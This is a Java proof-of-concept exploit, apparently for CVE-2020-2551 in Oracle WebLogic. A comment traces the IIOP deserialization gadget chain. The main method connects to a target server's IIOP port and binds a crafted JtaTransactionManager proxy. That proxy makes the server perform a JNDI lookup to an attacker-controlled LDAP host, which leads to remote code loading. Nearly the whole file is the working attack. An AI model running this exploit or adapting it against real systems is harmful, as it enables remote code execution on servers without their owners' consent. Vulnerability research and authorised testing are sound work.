package CVE20202551;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import javax.naming.*;
import java.util.Hashtable;
import java.rmi.Remote;


import util.Gadgets;
import weblogic.iiop.IOPProfile;


/**
 * @ClassName: demo
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/8/3 15:55
 * @Version: v1.0.0
 * @Description:
 **/

/**
 * Gadget chain
 *
 *      Context.rebind()
 *          InitialContext.rebind()
 *              ContextImpl.rebind()
 *                  _NamingContextAnyStub.rebind_any()
 *                      ............
 *                          IIOPInputStream.read_value()
 *                              ValueHandlerImpl.readValue()
 *                                  ValueHandlerImpl.readValueData()
 *                                      JtaTransactionManager.readObject()
 *                                          JtaTransactionManager.initUserTransactionAndTransactionManager()
 *                                              JtaTransactionManager.lookupUserTransaction()
 *                                                  JndiTemplate.lookup()
 *
 *
 */
public class demo {

    public static long TIME_OUT=15000L;

    public static void main(String[] args) throws Exception {
        IOPProfile.IP = "192.168.116.146";
        IOPProfile.PORT = 7001;

        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        // 修改对应的iiop主机ip端口
        env.put("java.naming.provider.url", "iiop://192.168.116.146:7001"); // 127.0.0.1 = 2130706433
//        env.put("weblogic.jndi.requestTimeout", TIME_OUT + "");
        Context context = new InitialContext(env);

        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://192.168.116.1:1389/Weblogicpoc");
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("summersec", jtaTransactionManager), Remote.class);

        context.rebind("hello", remote);

    }


}
